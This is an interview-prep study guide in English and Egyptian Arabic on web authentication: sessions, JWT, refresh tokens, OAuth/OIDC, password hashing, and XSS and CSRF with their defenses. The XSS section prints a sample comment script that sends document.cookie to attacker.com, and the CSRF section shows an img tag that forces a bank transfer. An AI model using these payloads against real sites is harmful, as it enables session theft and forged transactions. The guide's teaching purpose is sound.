# Authentication & Authorization — Interview Q&A

Covers: authN vs authZ · sessions · JWT · access + refresh tokens · token storage · OAuth 2.0 basics · common attacks.
Format: bullets + **answer:** in Arabic + English keywords.
📖 Resources:
- 🎥 [Fireship — Session vs Token in 100s](https://www.youtube.com/watch?v=UBUNrFtufWo) (super quick)
- 🎥 [Piyush Garg — JWT vs Sessions](https://youtube.com/watch?v=xrj3zzaqODw) (deeper, ~15 min)
- 📄 [jwt.io — Introduction](https://jwt.io/introduction)
- 📄 [Auth0 — JWT](https://auth0.com/docs/secure/tokens/json-web-tokens)

---

## TOPIC 1 — Core concepts

### Q1. Authentication vs Authorization? ⭐
- **Authentication** — verifying identity (login).
- **Authorization** — checking permissions.
- Authentication comes first, then Authorization.

**Example:**
- login by email/password = **Authentication**.
- Checking "is this user an admin?" and get response with the user data = **Authorization**.
---

## TOPIC 2 — Sessions

### Q2. How does session-based auth work?
1. User logs in → server verifies credentials.
2. Server creates a **session** (stored server-side: memory / Redis / DB) + assigns a **session ID**.
3. Session ID sent to client in a **cookie** (usually httpOnly).
4. Every request → cookie sent automatically → server looks up the session ID → knows the user.
5. Logout → server deletes the session.

```
Client                        Server
  │                             │
  │─── POST /login ───────────>│
  │                             │  ← creates session { sid: abc, user_id: 42 }
  │<── Set-Cookie: sid=abc ────│     stored in Redis / DB
  │                             │
  │─── GET /profile (Cookie) ─>│  ← looks up sid=abc → user_id=42
  │<── profile data ───────────│
```

**Stateful** — server remembers each session.

**answer:** الـ **session-based auth**: بعد الـ login، السيرفر بيعمل **session** ويخزّنها server-side (memory / Redis / DB) ويرجّع الـ **session ID** في **cookie**. كل request بعد كده بيبعت الـ cookie أوتوماتيك، السيرفر بيبصّ في الـ session store ويلاقي الـ user. **stateful** — السيرفر بيحتفظ بحالة كل مستخدم.

---

## TOPIC 3 — JWT

### Q3. What is a JWT? Structure? ⭐⭐
**JWT = JSON Web Token** — string encoded بيحتوي معلومات الـ user، الـ server بيوقّعه، فأي حد يقدر يتحقق منه بدون الرجوع للـ DB.

**3 parts** مفصولة بـ `.`:
```
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiIsIm5hbWUiOiJTYWxtYSJ9.abc123signature
```

1. **Header** — الـ algorithm بتاع التوقيع (HS256, RS256).
   ```json
   { "alg": "HS256", "typ": "JWT" }
   ```

2. **Payload (claims)** — بيانات الـ user + metadata (`sub`, `exp`, `iat`, `role`).
   ```json
   { "sub": "42", "name": "Salma", "role": "admin", "exp": 1710000000 }
   ```

3. **Signature** — الـ server بيوقّع الـ (header + payload) بـ **secret key**.
   ```
   HMACSHA256(base64(header) + "." + base64(payload), secret)
   ```

**⚠️ الـ payload مش مشفّر — بس base64-encoded** (أي حد يقدر يقرأه). الـ signature بس بيمنع **التعديل** — لو حد غيّر الـ payload، الـ signature تبطل تتطابق.

**answer:** الـ **JWT** = **JSON Web Token**، string من 3 أجزاء مفصولة بـ `.`: **header** (algorithm) + **payload** (بيانات الـ user + `exp`) + **signature** (توقيع الـ server بـ secret key). الـ payload **مش مشفّر** — base64-encoded بس، فأي حد يقرأه. الـ signature بيمنع **التعديل** لأنه بيحتاج الـ secret. السيرفر يتحقق من التوقيع بـ الـ secret بدون ما يرجع للـ DB.

---

### Q4. How does JWT auth work?
1. User logs in → server verifies + creates JWT (payload + signs with secret).
2. Server sends the JWT to the client.
3. Client stores it (cookie / localStorage — see Q6).
4. Every request → client sends JWT in `Authorization: Bearer <token>` header.
5. Server verifies signature (with the same secret) → trusts the payload → knows the user.
6. **Stateless** — server doesn't store the token anywhere.

```
Client                           Server
  │                                │
  │─── POST /login ──────────────>│
  │                                │  ← creates JWT (payload + signature)
  │<── { token: "eyJ..." } ───────│     nothing stored server-side
  │                                │
  │─── GET /profile               │
  │    Authorization: Bearer ────>│  ← verifies signature with secret
  │                                │     reads payload → user_id=42
  │<── profile data ──────────────│
```

**answer:** بعد الـ login، السيرفر بيعمل الـ JWT ويرجّعه للـ client. كل request بعدها بيبعت الـ JWT في header `Authorization: Bearer <token>`. السيرفر يتحقق من التوقيع بالـ secret ويقرا الـ payload → **stateless** — مفيش حاجة متخزّنة على السيرفر.

---

### Q5. Sessions vs JWT? ⭐⭐ (asked constantly)
| | Sessions | JWT |
|--|----------|-----|
| **State** | Stateful (server stores) | Stateless (self-contained) |
| **Where stored** | Server (Redis/DB) + cookie | Client (cookie/localStorage) |
| **Scaling** | Needs shared session store | Any server can verify |
| **Revoke on logout** | ✅ delete server-side | ❌ can't revoke until expiry (unless blacklist) |
| **Size** | Small (just an ID) | Larger (payload + signature) |
| **Best for** | Traditional web apps | APIs, mobile, microservices, SSO |

**Trade-off:** JWT easier to scale (no session store), but **harder to revoke** — you must keep a blacklist to log someone out immediately.

**answer:** الـ **sessions** = **stateful** (السيرفر بيخزّن)، سهل عمل logout (احذف الـ session)، بس محتاج **shared store** (Redis) عشان تعمل scale. الـ **JWT** = **stateless** (self-contained)، أي server يقدر يتحقق منه من غير ما يرجع للـ DB — كويس للـ **APIs + microservices + mobile**. عيبه: مينفعش يتـ **revoke** فورًا (لازم tokens blacklist). الاختيار: sessions للـ traditional apps، JWT للـ APIs الموزّعة.

---

## TOPIC 4 — Access + Refresh Tokens

### Q6. Access token vs Refresh token? ⭐
**Problem:** JWT can't be revoked → if stolen, attacker has access until expiry. **Solution:** short-lived access + long-lived refresh.

- **Access token** — 5-15 min. Sent in every request.
- **Refresh token** — 7-30 days. Sent **only** to `/auth/refresh` to get a new access token.

**Where each is stored:**

| | Access Token | Refresh Token |
|--|--------------|---------------|
| On server (DB) | ❌ nothing (stateless) | ✅ stored as **hash** (like passwords) |
| On client | JS memory or HttpOnly cookie | **HttpOnly cookie**, `Path=/auth/refresh` |
| Sent with every request? | ✅ yes | ❌ only for /refresh |
| Can be revoked? | ❌ hard | ✅ easy (flag in DB) |

**Refresh token table (server-side):**
```sql
CREATE TABLE refresh_tokens (
  token_hash  VARCHAR(64) PRIMARY KEY,   -- hash, NOT raw token
  user_id     INTEGER,
  expires_at  TIMESTAMPTZ,
  revoked     BOOLEAN DEFAULT FALSE
);
```

**Full flow:**
```
LOGIN
  Client ──POST /login──> Server
                          - creates access (JWT, 15 min)
                          - creates refresh (random 64 char)
                          - stores hash(refresh) in DB
  Client <── { access } + Set-Cookie: refresh=... (HttpOnly, Path=/auth/refresh)

NORMAL REQUEST
  Client ──GET /profile   Authorization: Bearer <access>──> Server
                                                             (verifies JWT signature, no DB hit)

ACCESS EXPIRED
  Client ──POST /auth/refresh   Cookie: refresh=... (auto)──> Server
                                                              - hash the incoming token
                                                              - look up in DB
                                                              - check: not revoked, not expired
                                                              - return new access token
  Client <── { access: "new_..." }

LOGOUT (revoke)
  Client ──POST /logout──> Server
                           UPDATE refresh_tokens SET revoked=true WHERE token_hash=...
  Client <── Set-Cookie: refresh=; Max-Age=0
```

**Revoked = ملغى قسريًا قبل الانتهاء الطبيعي.** الفرق عن expired: expired = الوقت خلص لوحده. revoked = السيرفر أنهاه بإرادته (logout، password change، token stolen).

**Best practice — Refresh Token Rotation:** كل تجديد يرجّع refresh token **جديد** ويعمل revoke للقديم. لو الهاكر سرق refresh واستخدمه → لما الـ user يستخدم القديم → يفشل → السيرفر يعرف فيه سرقة → revoke كل tokens الـ user.

**answer:** الـ **access token** short-lived (5-15 دقيقة)، بيتبعت في كل request، **مش متخزّن على server**. الـ **refresh token** long-lived (7-30 يوم)، بيتخزّن **hashed في DB** (نفس مبدأ passwords)، وعلى الـ client في **HttpOnly cookie بـ `Path=/auth/refresh`** — بيتبعت بس عند التجديد مش مع كل request. ده بيدّينا **stateless للـ access** + **قدرة revoke للـ refresh** (زي logout, password change). **Refresh Token Rotation** = كل تجديد يعمل token جديد ويلغي القديم — يكشف السرقة بسرعة. **ما نخزّنش الـ refresh في localStorage أبدًا** — XSS يسرقه ويقدر يجدّد access لأيام.

---

## TOPIC 5 — Token Storage

### Q7. Where should you store the JWT on the client? ⭐⭐
Two options — both have security trade-offs:

**Option A — httpOnly cookie** (recommended):
- ✅ **JavaScript ما يقدرش يقراه** → محمي من **XSS**.
- ❌ **CSRF risk** — الـ cookie بتتبعت أوتوماتيك في requests من مواقع تانية.
- الحل: `SameSite=Strict` + CSRF tokens.

**Option B — localStorage**:
- ✅ مفيش CSRF (JS اللي بيبعته يدوي).
- ❌ **XSS risk** — أي script بيتحقن يقدر يقراه ويسرقه.

| Risk | httpOnly cookie | localStorage |
|------|:---------------:|:------------:|
| XSS steals token | ❌ safe | ✅ vulnerable |
| CSRF | ✅ vulnerable | ❌ safe |

**Best practice:** **httpOnly cookie + SameSite=Strict + CSRF token**. Never store JWT in localStorage in production.

**answer:** فيه **اختيارين**: **httpOnly cookie** آمن من **XSS** (JS مش شايفه) بس فيه **CSRF risk** → بحلّها بـ `SameSite=Strict` + CSRF token. أو **localStorage** آمن من CSRF بس **XSS يقدر يسرقه**. **الأفضل: httpOnly cookie** لأن الـ XSS خطر أكبر عمليًا.

---

## TOPIC 6 — OAuth 2.0

### Q8. What is OAuth 2.0? ⭐
**OAuth 2.0** = protocol بيسمح لتطبيق يوصل لبيانات user من خدمة تانية (Google, Facebook) **بدون ما يعرف الـ password**.

**مثال:** لما تدخلي موقع بـ "Login with Google":
1. الموقع يوجّهك لـ Google.
2. Google بتسألك: "هل توافقي إن الموقع ده يوصل لبياناتك؟"
3. توافقي → Google بترجّع **authorization code** للموقع.
4. الموقع بيبدّل الـ code بـ **access token** من Google.
5. الموقع يستخدم الـ token يجيب بياناتك (email, name).

**الفرق عن authentication:** OAuth أساسًا **authorization** (السماح بالوصول)، مش authN. بس بيستخدم كتير للـ **social login**.

**answer:** الـ **OAuth 2.0** protocol بيسمح لتطبيق يوصل لبيانات user من خدمة تانية (زي Google) **من غير ما يعرف الـ password**. Flow: user يوافق → provider يرجّع **authorization code** → الـ app يبدّله بـ **access token** → يستخدمه يجيب البيانات. أساسًا **authorization protocol**، بس بيُستخدم للـ **social login** كتير.

---

### Q9. OAuth vs OpenID Connect (OIDC)?
- **OAuth 2.0** = authorization (وصول للـ resources).
- **OpenID Connect (OIDC)** = طبقة **authentication** فوق OAuth 2.0 (بيديك **ID token** بيقول مين الـ user).

يعني: "Login with Google" = **OIDC** (بيسألك مين الـ user). "Give the app access to my Google Drive" = **OAuth** بحت.

**answer:** الـ **OAuth 2.0** للـ **authorization** (وصول)، الـ **OIDC** طبقة **authentication** فوقه بيدّي **ID token** يعرّف الـ user. "Login with Google" فعليًا OIDC.

---

## TOPIC 7 — Security Attacks (Auth-related)

### Q10. XSS vs CSRF — most-asked ⭐⭐

The two are often confused. Different attack, different defense.

---

## 🚨 XSS (Cross-Site Scripting)

**Idea:** Attacker **injects JavaScript into the victim's page** (via comment, ad, input field). The script runs in the browser as if it's part of the site → can read cookies (if not `HttpOnly`), localStorage, or make requests as the user.

**Example — comment section that doesn't escape input:**
```html
<!-- Attacker leaves this as a comment on a blog: -->
<script>
  fetch("https://attacker.com/steal?c=" + document.cookie)
</script>
```
When another user opens the blog → the browser runs the script → sends their cookie to attacker.

**Defenses:**
- **`HttpOnly` cookie** → JS can't read `document.cookie` at all.
- **Escape user input** — turn `<script>` into `&lt;script&gt;` so it renders as text, not code. Frameworks (React, Vue) do this by default.
- **Content Security Policy (CSP)** — HTTP header restricting where scripts can load from.

---

## 🎯 CSRF (Cross-Site Request Forgery)

**Idea:** A **malicious site tricks the victim's browser** into making a request to another site the victim is logged into. The browser **auto-sends the cookie** → the target site trusts it.

**Trick:** the attacker never steals the cookie — just exploits the fact that browsers send cookies automatically to their owning domain.

**Example — victim is logged into BankApp.com, then opens attacker.com:**
```html
<!-- On attacker.com — looks like a cat photo but is actually a request -->
<img src="https://BankApp.com/transfer?to=hacker&amount=10000">
```
The browser sees the `<img>`, tries to load it → makes a GET request to BankApp with the **victim's cookie attached automatically** → bank sees valid session → executes the transfer.

**Defenses:**

**1. `SameSite=Strict` cookie flag** — browser refuses to send the cookie on requests coming from other sites:
```
Set-Cookie: sid=xJ7...; HttpOnly; Secure; SameSite=Strict
```

**2. CSRF Token** — random value the server puts in the form; must be sent back with submit; attacker can't guess it (blocked by Same-Origin Policy).
```
1. GET /transfer-page
   → server generates token "abc123xyz", stores it in session,
     puts it in the form as a hidden field:
     <form>
       <input type="hidden" name="csrf_token" value="abc123xyz">
       <input name="amount">
     </form>

2. User submits → POST /transfer with csrf_token=abc123xyz
   → server checks: token in form == token in session? ✅ accept

3. Attacker.com tries the same POST → doesn't know the token
   (Same-Origin Policy blocks reading BankApp's HTML) → send blank/random
   → server rejects ❌
```

**3. Check `Origin` / `Referer` headers** — reject requests from unknown domains.

**4. Re-authenticate for sensitive actions** — ask for password before big transfers.

---

## Side-by-side: XSS vs CSRF

| | **XSS** | **CSRF** |
|--|---------|----------|
| Where the malicious code runs | **Inside the trusted site** (injected) | **On the attacker's site**, targeting the trusted site |
| Attacker needs | to sneak a `<script>` into the page | to get victim to visit attacker.com while logged in |
| Cookie handling | Attacker **reads/steals** the cookie (if not HttpOnly) | Browser **auto-sends** the cookie; attacker never sees it |
| Defense | `HttpOnly` + escape input + CSP | `SameSite=Strict` + CSRF token |

**One-line difference:**
- **XSS** = "attacker injects script into my site to steal a cookie."
- **CSRF** = "attacker makes the victim's browser send a request using its own cookie, from another site."

---

### Other common attacks (shorter)
- **Brute force** — try many passwords → **rate limiting + account lockout + 2FA**.
- **JWT tampering** — modify payload → **signature** blocks it (needs the secret).

---

## TOPIC 8 — Passwords

### Q11. Password storage — Signup + Login flow ⭐
**Never store plaintext.** Hash with a **slow** algorithm (**bcrypt / argon2**, NOT MD5/SHA-256) + **salt** per user (prevents rainbow tables).

**Signup flow:**
```
1. User sends password.
2. bcrypt.hash(password, cost=12) → generates random salt + hashes
3. Store the result in DB.  (salt is embedded inside the hash string)
   → users.password_hash = "$2b$12$aB3xK9pQ...abc123"
                            │  │  │─────────┼─────────
                            │  │  salt      hash
                            │  cost
                            algorithm
4. Original password never stored anywhere.
```

**Login flow:**
```
1. User sends email + password.
2. Fetch stored_hash from DB by email.
3. bcrypt.compare(input_password, stored_hash)
     - extracts salt from stored_hash
     - hashes input with same salt
     - constant-time comparison (prevents timing attacks)
4. match ✅ → create session/JWT
   mismatch ❌ → reject
```

**Why slow?** cost=12 → ~400ms per hash. User waits once at login (fine). Attacker brute-forcing a million passwords waits **days** per million (unusable).

**Code (Node):**
```js
// signup
const hash = await bcrypt.hash(password, 12);
await db.query("INSERT INTO users (email, password_hash) VALUES ($1, $2)", [email, hash]);

// login
const user = await db.query("SELECT password_hash FROM users WHERE email=$1", [email]);
const match = await bcrypt.compare(password, user.password_hash);
```

**answer:** **plaintext ممنوع**. **Signup:** السيرفر يولّد **salt** عشوائي، يعمل **`bcrypt.hash(password, cost=12)`** → النتيجة = salt + hash مدموجين في string واحد يتخزّن في DB. الـ password الأصلي ما يتحفظش. **Login:** السيرفر يجيب الـ stored hash من DB، يعمل **`bcrypt.compare(input, stored_hash)`** اللي بيستخرج الـ salt من الـ hash ويعيد hashing للـ input بنفس الـ salt ويقارن **constant-time** (يمنع timing attacks). الـ bcrypt بطيء بالتصميم عشان يمنع brute-force.

---

## ✅ Self-Test (say out loud)
1. authN vs authZ — one line each.
2. How does session-based auth work end-to-end?
3. JWT structure — 3 parts + what each is.
4. Is the JWT payload encrypted?
5. Sessions vs JWT — trade-offs.
6. Why access + refresh tokens?
7. httpOnly cookie vs localStorage — pros and cons of each.
8. What's OAuth 2.0? How is it different from OIDC?
9. XSS vs CSRF — how each works and how to prevent.
10. How should passwords be stored?
